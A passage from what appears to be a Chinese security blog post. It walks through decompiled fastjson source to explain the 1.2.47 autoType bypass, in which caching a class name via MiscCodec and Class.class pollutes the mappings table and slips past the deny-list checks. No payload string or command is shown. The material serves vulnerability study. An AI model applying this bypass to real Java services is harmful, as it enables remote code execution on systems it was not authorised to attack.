<span class="keyword">else</span> <span class="keyword">if</span> ((h1 ^ (<span class="keyword">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">long</span> h3 = (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">2</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="keyword">long</span> hash;</span><br><span class="line">            <span class="keyword">int</span> i;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                hash = h3;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                    hash ^= (<span class="keyword">long</span>)className.charAt(i);</span><br><span class="line">                    hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                    <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里很清楚的看到了在源码中程序对第一个字符的判断，经过测试后发现为 [ ，程序对 [ 开头的class也进行了相应的判断；并且将L开头和 ; 结尾的class全都进行了throw false的处理，所以到此，原本的payload已经完全无法使用，需要去寻找新的payload去进行攻击；</p>
<h2 id="在此后的版本中，fastjson也都是一直在补充黑名单；有意义的是在1-2-47；fastjson爆出了一个通杀的payload；"><a href="#在此后的版本中，fastjson也都是一直在补充黑名单；有意义的是在1-2-47；fastjson爆出了一个通杀的payload；" class="headerlink" title="在此后的版本中，fastjson也都是一直在补充黑名单；有意义的是在1.2.47；fastjson爆出了一个通杀的payload；"></a>在此后的版本中，fastjson也都是一直在补充黑名单；有意义的是在1.2.47；fastjson爆出了一个通杀的payload；</h2><p>这个漏洞的利用需要autoTypeSupport为false的时候才可利用；因为之前也说过，在check函数中是并行着autoTypeSupport为true和false的代码块的。所以在此再来审计下新版本的流程：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;<span class="comment">//因为我们肯定传入class，所以这里tyepname肯定不为null；所以可以直接跳过；</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &lt; <span class="number">128</span> &amp;&amp; typeName.length() &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">        String className = typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">long</span> BASIC = -<span class="number">3750763034362895579L</span>;</span><br><span class="line">        <span class="keyword">long</span> PRIME = <span class="number">1099511628211L</span>;</span><br><span class="line">        <span class="keyword">long</span> h1 = (-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span>;<span class="comment">//拿到第一个字符的hash</span></span><br><span class="line">        <span class="keyword">if</span> (h1 == -<span class="number">5808493101479473382L</span>) &#123;<span class="comment">//判断是否为“ [ ”</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((h1 ^ (<span class="keyword">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;<span class="comment">//判断是否为L开头和;结尾</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">long</span> h3 = (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">2</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="keyword">long</span> hash;</span><br><span class="line">            <span class="keyword">int</span> i;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;<span class="comment">//当autoTypeSupport为false的时候直接跳过；</span></span><br><span class="line">                hash = h3;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                    hash ^= (<span class="keyword">long</span>)className.charAt(i);</span><br><span class="line">                    hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                    <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//跳过代码块直接进入后续此代码；</span></span><br><span class="line">            <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;<span class="comment">//如果为null，则会从两个mapping中去寻找class name；</span></span><br><span class="line">                clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                clazz = <span class="keyword">this</span>.deserializers.findClass(typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;<span class="comment">//如果找到了相应的class；然后进到后续的if判断，显然if不对，所以直接return clazz；</span></span><br><span class="line">              <span class="comment">//这里逻辑也就是说只要在mapping中找到了我们的类，就会直接return；因为expectClass直接传入就为null；</span></span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//如果在mapping中没有找到相应的class；就会去进行黑白名单比对从而去决定是否loadClass；然后return下load后的；</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                    hash = h3;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                        <span class="keyword">char</span> c = className.charAt(i);</span><br><span class="line">                        hash ^= (<span class="keyword">long</span>)c;</span><br><span class="line">                        hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                        <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                                clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (TypeUtils.getAnnotation(clazz, JSONType.class) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, <span class="keyword">this</span>.propertyNamingStrategy);</span><br><span class="line">                    <span class="keyword">if</span> (beanInfo.creatorConstructor != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> mask = Feature.SupportAutoType.mask;</span><br><span class="line">                <span class="keyword">boolean</span> autoTypeSupport = <span class="keyword">this</span>.autoTypeSupport || (features &amp; mask) != <span class="number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到起整体的代码流程，其实其防护的也就是那些恶意的class和其恶意的绕过方式，其实如果可以找到其他的利用class；就可以轻松的过其的拦截，直接到后面的判断clazz是否为空，然后直接loadClass；不过fastjson更新到了这个地步已经很安全了；恶意的class类用已经更加的困难了；至于后续的代码，是当我们自己构造一个class的时候并且想去反序列化自己构造的类的时候，才会经过一系列的判断后进入JavaBeanInfo的build方法去进行build；之前也追溯过build的方法，就是去调用setter和getter方法触发javabean；那就是后续的说法了，我们漏洞的利用利用点是其fastjson的内置的class；后者java的jdk自带的class；所以不必追溯此；</p>
<p>所以经过上述的一点分析，如果我们不是利用的新的class进行攻击触发点，那么我们就需要去控制mapping；如果可以控制mapping的话，那么我们在再次去反序列化的时候就会去到mapping中找到相应的class从而触发我们想要触发的恶意class；新型通杀exp就是利用此；也就是我们需要合理的控制代码的走向，及时的溜出去达到return的效果；</p>
<p>要想控制mapping，那么我们就来看看如何控制；先来分析两个mapping都是什么，之前也贴出过，这就不再说了，可以直接到上面去看写的mapping；IdentityHashMap的mapping和ConcurrentHashMap的mapping</p>
<p>这里简单的追溯下不难发现；对于ConcurrentHashMap类的mapping来说；在调试中，发现其是程序最开始默认的mapping；但是有个点，可以控制的；在TypeUtils class下的loadClass方法中，有个mapping.put方法；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="keyword">boolean</span> cache) &#123;</span><br><span class="line">    <span class="keyword">if</span> (className != <span class="keyword">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = (Class)mappings.get(className);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (classLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    clazz = classLoader.loadClass(className);</span><br><span class="line">                    <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                        mappings.put(className, clazz);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>只要最开始的clazz没有在mapping中找到，而且我们传入的class不以[ 和 L开头 ; 结尾，就可进入最后的敏感代码区域；并且在判断类加载器不为空和cache为true的情况下会put我们的classname；就挺好的；可以看到classLoader是在函数触发的时候传入的；cache也是在触发的时候传入的，追溯一下上一个函数；</p>
<p>发现在同class下存在：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很清晰的看到如果我们可以调用到此函数，那么就可承接下面的loadClass function从而进入mapping.put的环节从而可以污染mapping；那么现在就是需要去寻找那个class中调用了TypeUntil class下的loadClass（两个参数）函数了；又因为在最后的loadClass中有判定，所以ClassLoader不能为null；否则将直接return，不会调用其中的流程将恶意的class写入mapping；</p>
<p>最后在MiscCodec.java下的deserialze方法中调用；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//clazz类型等于InetSocketAddress.class的处理。</span></span><br><span class="line">        <span class="comment">//因为我们需要的clazz必须为Class.class，不进入</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == InetSocketAddress.class) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object objVal;</span><br><span class="line">        <span class="comment">//下面这段赋值objVal这个值</span></span><br><span class="line">        <span class="comment">//此处if对于parser.resolveStatus这个值进行了判断</span></span><br><span class="line">  <span class="comment">//下面有截图可判断其解析样子；</span></span><br><span class="line">        <span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">            <span class="comment">//当parser.resolveStatus的值为  TypeNameRedirect</span></span><br><span class="line">            parser.resolveStatus = DefaultJSONParser.NONE;<span class="comment">//0</span></span><br><span class="line">            parser.accept(JSONToken.COMMA);<span class="comment">//16</span></span><br><span class="line">            <span class="comment">//lexer为json串的下一处解析点的相关数据</span></span><br><span class="line">             <span class="comment">//如果下一处的类型为string</span></span><br><span class="line">            <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;<span class="comment">//4</span></span><br><span class="line">                <span class="comment">//判断解析的下一处的值是否为val，如果不是val，报错退出</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//移动lexer到下一个解析点</span></span><br><span class="line">                <span class="comment">//举例：&quot;val&quot;:(移动到此处-&gt;)&quot;xxx&quot;</span></span><br><span class="line">                lexer.nextToken();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            parser.accept(JSONToken.COLON);</span><br><span class="line">            <span class="comment">//此处获取下一个解析点的值&quot;xxx&quot;赋值到objVal</span></span><br><span class="line">            objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">            parser.accept(JSONToken.RBRACE);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//当parser.resolveStatus的值不为TypeNameRedirect</span></span><br><span class="line">            <span class="comment">//直接解析下一个解析点到objVal</span></span><br><span class="line">            objVal = parser.parse();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String strVal;</span><br><span class="line">        <span class="comment">//strVal由objVal来进行赋值；</span></span><br><span class="line">        <span class="keyword">if</span> (objVal == <span class="keyword">null</span>) &#123;</span><br><span class="line">            strVal = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            strVal = (String) objVal;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//不必进入的代码块；</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (strVal == <span class="keyword">null</span> || strVal.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//省略诸多。。。。</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">           <span class="comment">//当clazz为Class.class的时候会进入loadClass我们渴望的恶意代码块；</span></span><br><span class="line">            <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为直击loadClass点，发现其clazz必须为Class.class,然而最开始进行了一个判断clazz是否为InetSocketAddress.class的限制，所以if下的代码块直接跳过；这里将记录放在代码中方便后续复习；</p>
<p>所以我们的关键的代码点就去到了parser.resolveStatus下；追溯下：</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gyZGss"><img src="https://z3.ax1x.com/2021/05/14/gyZGss.png" alt="gyZGss.png"></a></p>
<p>这里简单的追溯下不难发现，是当resolveStatus为2的时候，可以进入大的if语句；</p>
<p>这里插一句，在调试的时候可能很多师傅发现token刚开始为12；这里我解释下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;&#123;&#x27;</span>:</span><br><span class="line">    <span class="keyword">this</span>.next();</span><br><span class="line">    <span class="keyword">this</span>.token = <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到，这里经过我们的判定在第一个字符扫描到了打括号的开始，因为我们传入的是json数据，所以第一个字符肯定为大括号，所以就在此token被赋值为12；</p>
<p>然后注意如下的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == <span class="string">&#x27;&quot;&#x27;</span>) &#123;</span><br><span class="line">    key = lexer.scanSymbol(<span class="keyword">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    lexer.skipWhitespace();</span><br><span class="line">    ch = lexer.getCurrent();</span><br><span class="line">    <span class="keyword">if</span> (ch != <span class="string">&#x27;:&#x27;</span>) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里显然是获取json的key；那么其简单的逻辑是，首先来扫描，拿到第一个引号 “ 记录下其位置，然后利用next向后扫描，然后拿到key的值，期间每扫一遍都是要和第一个引号 “ 相互比较，然后看其是否相等，其用意就是拿到双引号闭合的时候的数据；最后</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">this</span>.sp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.next();</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将key放入key缓存SymbolTable中之后，Return value;返回我们的key给key变量；自此，key的值已经赋值完成；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gIiubF"><img src="https://z3.ax1x.com/2021/05/19/gIiubF.png" alt="gIiubF.png"></a></p>
<p>然后接着往下这几步：</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gIiJv6"><img src="https://z3.ax1x.com/2021/05/19/gIiJv6.png" alt="gIiJv6.png"></a></p>
<p>简单审计下代码会发现是判断是否为结束；即判断其是否为key的结束从而去读取value，还是直接是传入json的结束从而结束；</p>
